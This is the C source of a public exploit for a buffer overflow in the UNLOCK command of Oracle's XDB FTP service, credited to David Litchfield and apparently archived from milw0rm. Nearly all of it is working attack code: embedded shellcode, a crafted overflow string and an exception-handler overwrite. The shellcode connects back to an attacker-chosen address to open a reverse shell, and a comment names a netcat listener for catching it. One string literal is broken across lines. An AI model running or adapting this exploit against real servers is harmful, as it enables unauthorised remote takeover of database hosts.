/*  Oracle XDB FTP Service UNLOCK Buffer Overflow Exploit  */
/*    David Litchfield from ngssoftware (at Blackhat 2003)   */
/*                                                                                */
/*  Original Advisory :                                                     */
/*  http://www.blackhat.com/presentations/bh-usa-03/bh-  */
/*  us-03-litchfield-paper.pdf                                           */


#include <stdio.h> 
#include <windows.h> 
#include <winsock.h> 

int GainControlOfOracle(char *, char *); 
int StartWinsock(void); 
int SetUpExploit(char *,int); 

struct sockaddr_in s_sa; 
struct hostent *he; 
unsigned int addr; 
char host[260]="";

unsigned char exploit[508]= 
"\x55\x8B\xEC\xEB\x03\x5B\xEB\x05\xE8\xF8\xFF\xFF\xFF\xBE\xFF\xFF" 
"\xFF\xFF\x81\xF6\xDC\xFE\xFF\xFF\x03\xDE\x33\xC0\x50\x50\x50\x50" 
"\x50\x50\x50\x50\x50\x50\xFF\xD3\x50\x68\x61\x72\x79\x41\x68\x4C" 
"\x69\x62\x72\x68\x4C\x6F\x61\x64\x54\xFF\x75\xFC\xFF\x55\xF4\x89" 
"\x45\xF0\x83\xC3\x63\x83\xC3\x5D\x33\xC9\xB1\x4E\xB2\xFF\x30\x13" 
"\x83\xEB\x01\xE2\xF9\x43\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xEC" 
"\x83\xC3\x10\x53\xFF\x75\xFC\xFF\x55\xF4\x89\x45\xE8\x83\xC3\x0C" 
"\x53\xFF\x55\xF0\x89\x45\xF8\x83\xC3\x0C\x53\x50\xFF\x55\xF4\x89" 
"\x45\xE4\x83\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xE0\x83" 
"\xC3\x0C\x53\xFF\x75\xF8\xFF\x55\xF4\x89\x45\xDC\x83\xC3\x08\x89" 
"\x5D\xD8\x33\xD2\x66\x83\xC2\x02\x54\x52\xFF\x55\xE4\x33\xC0\x33" 
"\xC9\x66\xB9\x04\x01\x50\xE2\xFD\x89\x45\xD4\x89\x45\xD0\xBF\x0A" 
"\x01\x01\x26\x89\x7D\xCC\x40\x40\x89\x45\xC8\x66\xB8\xFF\xFF\x66" 
"\x35\xFF\xCA\x66\x89\x45\xCA\x6A\x01\x6A\x02\xFF\x55\xE0\x89\x45" 
"\xE0\x6A\x10\x8D\x75\xC8\x56\x8B\x5D\xE0\x53\xFF\x55\xDC\x83\xC0" 
"\x44\x89\x85\x58\xFF\xFF\xFF\x83\xC0\x5E\x83\xC0\x5E\x89\x45\x84" 
"\x89\x5D\x90\x89\x5D\x94\x89\x5D\x98\x8D\xBD\x48\xFF\xFF\xFF\x57" 
"\x8D\xBD\x58\xFF\xFF\xFF\x57\x33\xC0\x50\x50\x50\x83\xC0\x01\x50" 
"\x83\xE8\x01\x50\x50\x8B\x5D\xD8\x53\x50\xFF\x55\xEC\xFF\x55\xE8" 
"\x60\x33\xD2\x83\xC2\x30\x64\x8B\x02\x8B\x40\x0C\x8B\x70\x1C\xAD" 
"\x8B\x50\x08\x52\x8B\xC2\x8B\xF2\x8B\xDA\x8B\xCA\x03\x52\x3C\x03" 
"\x42\x78\x03\x58\x1C\x51\x6A\x1F\x59\x41\x03\x34\x08\x59\x03\x48" 
"\x24\x5A\x52\x8B\xFA\x03\x3E\x81\x3F\x47\x65\x74\x50\x74\x08\x83" 
"\xC6\x04\x83\xC1\x02\xEB\xEC\x83\xC7\x04\x81\x3F\x72\x6F\x63\x41" 
"\x74\x08\x83\xC6\x04\x83\xC1\x02\xEB\xD9\x8B\xFA\x0F\xB7\x01\x03" 
"\x3C\x83\x89\x7C\x24\x44\x8B\x3C\x24\x89\x7C\x24\x4C\x5F\x61\xC3" 
"\x90\x90\x90\xBC\x8D\x9A\x9E\x8B\x9A\xAF\x8D\x90\x9C\x9A\x8C\x8C" 
"\xBE\xFF\xFF\xBA\x87\x96\x8B\xAB\x97\x8D\x9A\x9E\x9B\xFF\xFF\xA8" 
"\x8C\xCD\xA0\xCC\xCD\xD1\x9B\x93\x93\xFF\xFF\xA8\xAC\xBE\xAC\x8B" 
"\x9E\x8D\x8B\x8A\x8F\xFF\xFF\xA8\xAC\xBE\xAC\x90\x9C\x94\x9A\x8B" 
"\xBE\xFF\xFF\x9C\x90\x91\x91\x9A\x9C\x8B\xFF\x9C\x92\x9B\xFF\xFF" 
"\xFF\xFF\xFF\xFF"; 

char exploit_code[8000]= 
"UNLOCK / aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnn" 
"nooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAAAABBBBCCCCD" 
"DDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS 
T" 
"TTTUUUUVVVVWWWWXXXXYYYYZZZZabcdefghijklmnopqrstuvwxyzABCDEFGHIJK" 
"LMNOPQRSTUVWXYZ0000999988887777666655554444333322221111098765432" 
"1aaaabbbbcc"; 


char exception_handler[8]="\x79\x9B\xf7\x77"; 
char short_jump[8]="\xEB\x06\x90\x90"; 


int main(int argc, char *argv[]) 
{ 
if(argc != 6) 
{ 
printf("\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow Exploit"); 
printf("\n\t\tfor Blackhat (http://www.blackhat.com)"); 
printf("\n\n\tSpawns a reverse shell to specified port"); 
printf("\n\n\tUsage:\t%s host userid password ipaddress port",argv[0]); 
printf("\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)");
printf("\n\t6th July 2003\n\n\n"); 
return 0; 
} 
strncpy(host,argv[1],250); 
if(StartWinsock()==0) 
return printf("Error starting Winsock.\n"); 
SetUpExploit(argv[4],atoi(argv[5])); 
strcat(exploit_code,short_jump); 
strcat(exploit_code,exception_handler); 
strcat(exploit_code,exploit); 
strcat(exploit_code,"\r\n"); 


GainControlOfOracle(argv[2],argv[3]); 
return 0; 
} 


int SetUpExploit(char *myip, int myport) 
{ 
unsigned int ip=0; 
unsigned short prt=0; 
char *ipt=""; 
char *prtt=""; 


ip = inet_addr(myip); 
ipt = (char*)&ip; 
exploit[191]=ipt[0]; 
exploit[192]=ipt[1]; 
exploit[193]=ipt[2]; 
exploit[194]=ipt[3]; 
// set the TCP port to connect on 
// netcat should be listening on this port 
// e.g. nc -l -p 80 

prt = htons((unsigned short)myport); 
prt = prt ^ 0xFFFF; 
prtt = (char *) &prt; 
exploit[209]=prtt[0]; 
exploit[210]=prtt[1]; 
return 0; 
} 


int StartWinsock() { 
int err=0; WORD wVersionRequested; 
WSADATA wsaData; 
wVersionRequested = MAKEWORD( 2, 0 );
err = WSAStartup( wVersionRequested, &wsaData ); 
if ( err != 0 ) 
return 0; 

if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 ) 
{ WSACleanup( ); 
return 0; } 


if (isalpha(host[0])) { 
he = gethostbyname(host); 
s_sa.sin_addr.s_addr=INADDR_ANY; 
s_sa.sin_family=AF_INET; 
memcpy(&s_sa.sin_addr,he->h_addr,he->h_length); 
} else 
{ addr = inet_addr(host); 
s_sa.sin_addr.s_addr=INADDR_ANY; 
s_sa.sin_family=AF_INET; 
memcpy(&s_sa.sin_addr,&addr,4); 
he = (struct hostent *)1; 
} 
if (he == NULL) { 
return 0; } 
return 1; } 


int GainControlOfOracle(char *user, char *pass) { 
char usercmd[260]="user "; 
char passcmd[260]="pass "; 
char resp[1600]=""; 
int snd=0,rcv=0; 
struct sockaddr_in r_addr; 
SOCKET sock; 


strncat(usercmd,user,230); 
strcat(usercmd,"\r\n"); 
strncat(passcmd,pass,230); 
strcat(passcmd,"\r\n"); 


sock=socket(AF_INET,SOCK_STREAM,0); 
if (sock==INVALID_SOCKET) 
return printf(" sock error"); 
r_addr.sin_family=AF_INET; r_addr.sin_addr.s_addr=INADDR_ANY; 
r_addr.sin_port=htons((unsigned short)0);

s_sa.sin_port=htons((unsigned short)2100); 
if (connect(sock,(LPSOCKADDR)&s_sa,sizeof(s_sa))==SOCKET_ERROR) return printf("Connect error"); 
rcv = recv(sock,resp,1500,0); 
printf("%s",resp); 
ZeroMemory(resp,1600); 
snd=send(sock, usercmd , strlen(usercmd) , 0); 
rcv = recv(sock,resp,1500,0); 
printf("%s",resp); ZeroMemory(resp,1600); 


snd=send(sock, passcmd , strlen(passcmd) , 0); 
rcv = recv(sock,resp,1500,0); 
printf("%s",resp); 
if(resp[0]=='5') 
{ closesocket(sock); 
return printf("Failed to log in using user %s and password %s.\n",user,pass); 
} 
ZeroMemory(resp,1600); 
snd=send(sock, exploit_code, strlen(exploit_code) , 0); 
Sleep(2000); 
closesocket(sock); 
return 0; 
}

// milw0rm.com [2003-08-13]
